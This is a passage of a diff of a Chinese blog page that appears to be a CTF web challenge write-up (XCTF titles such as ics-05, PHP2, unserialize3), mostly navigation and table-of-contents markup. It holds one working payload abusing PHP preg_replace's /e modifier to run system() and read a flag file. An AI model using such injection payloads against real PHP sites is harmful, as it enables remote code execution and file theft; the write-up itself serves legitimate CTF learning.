+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/<span class="number">1234</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=<span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<p>即可得出flag<br><img src="http://img-blog.csdnimg.cn/20190905200039215.png" alt="在这里插入图片描述"></p>
+<p><strong>总结：这次就先总结到这里，下次继续总结！</strong></p>
 
     </article>
     <!-- license  -->
@@ -436,17 +487,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/09/05/XCTF(攻防世界)—进阶web题Write Up(二)/" title="XCTF(攻防世界)—进阶web题Write Up(二)">
-                    <div class="nextTitle">XCTF(攻防世界)—进阶web题Write Up(二)</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/08/31/了解PHP伪协议/" title="了解PHP伪协议">
-                    <div class="prevTitle">了解PHP伪协议</div>
+                <a href="/2019/09/02/Bugku—web题总结(三)/" title="Bugku—web题总结(三)">
+                    <div class="prevTitle">Bugku—web题总结(三)</div>
                 </a>
             
         </li>
@@ -571,7 +617,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#你从哪里来"><span class="toc-number">1.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序员本地网站"><span class="toc-number">2.</span> <span class="toc-text">程序员本地网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-collision-NUPT-CTF"><span class="toc-number">3.</span> <span class="toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#never-give-up"><span class="toc-number">4.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">5.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#管理员系统"><span class="toc-number">6.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login1-SKCTF"><span class="toc-number">7.</span> <span class="toc-text">login1(SKCTF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#求getshell"><span class="toc-number">8.</span> <span class="toc-text">求getshell</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mfw"><span class="toc-number">1.</span> <span class="toc-text">mfw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NaNNaNNaNNaN-Batman"><span class="toc-number">2.</span> <span class="toc-text">NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP2"><span class="toc-number">3.</span> <span class="toc-text">PHP2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize3"><span class="toc-number">4.</span> <span class="toc-text">unserialize3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-05"><span class="toc-number">5.</span> <span class="toc-text">ics-05</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
